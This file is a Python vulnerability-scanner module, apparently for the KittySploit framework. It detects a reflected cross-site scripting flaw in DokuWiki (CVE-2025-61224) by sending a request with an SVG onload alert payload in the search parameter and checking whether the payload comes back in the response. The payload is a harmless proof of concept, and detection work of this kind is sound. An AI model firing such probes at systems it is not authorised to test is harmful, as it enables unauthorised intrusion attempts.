#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DokuWiki 2025-05-14a 'Librarian' contains a stored XSS caused by improper sanitization of the 'q' parameter, l."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DokuWiki <= 2025-05-14a Librarian - Reflected Cross-Site Scripting Detection',
        'description': "DokuWiki 2025-05-14a 'Librarian' contains a stored XSS caused by improper sanitization of the 'q' parameter, letting remote attackers execute arbitrary scripts, exploit requires no special privileges.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'dokuwiki', 'xss', 'reflected'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/dokuwiki/dokuwiki/issues/4512',
            'https://github.com/MarioTesoro/vulnerability-research/tree/main/CVE-2025-61224',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-61224',
        ],
        'cve': 'CVE-2025-61224',
    }

    def run(self):
        r = self.http_request(method="GET", path='/doku.php?id=start&do=search&q=the%20%40%3Csvg%2Fonload%3Dalert%60document.domain%60%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('current changed">@<svg/onload=alert', 'content="DokuWiki',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="DokuWiki <= 2025-05-14a Librarian - Reflected Cross-Site Scripting detected",
                path='/doku.php?id=start&do=search&q=the%20%40%3Csvg%2Fonload%3Dalert%60document.domain%60%3E',
            )
            return True
        return False

